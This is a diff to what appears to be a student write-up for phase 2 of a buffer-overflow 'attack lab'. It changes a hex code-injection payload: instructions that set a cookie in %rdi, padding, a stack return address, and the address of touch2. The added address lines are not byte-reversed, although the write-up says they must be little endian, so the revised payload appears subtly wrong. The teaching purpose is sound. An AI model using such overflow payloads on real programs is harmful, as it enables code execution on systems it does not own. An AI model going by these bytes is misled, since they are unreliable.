@@ -51,7 +51,7 @@ Disassembly of section .text:
    0:	48 c7 c7 6d d8 51 34 	mov    $0x3451d86d,%rdi
    7:	c3                   	retq   
 ```
-The byte representation of the assembly code is ```48 c7 c7 6d d8 51 34 c3```.
+The byte representation of the assembly code is ```48 c7 c7 6d d8 51 34 c3``` => cookie.
 
 Now we need to find the address of rsp register:
 
@@ -101,11 +101,11 @@ The address on the left side is what we want => ```0x55617e98```.
 Now, create a text file named ```phase2.txt``` which will look something like below and don't forget the bytes for rsp and touch2 go in reverse (little endian).
 
 ```
-48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
+48 c7 c7 6d d8 51 34 c3 /*this sets your cookie*/
 00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
 00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
-d8 0c 62 55 00 00 00 00 /* address of register %rsp */
-8c 17 40 00 00 00 00 00 /*address of touch2 function */
+55 61 7e 98 00 00 00 00 /* address of register %rsp */
+40 19 45 00 00 00 00 00 /*address of touch2 function */
 ````
 Run it through ```hex2raw```
 
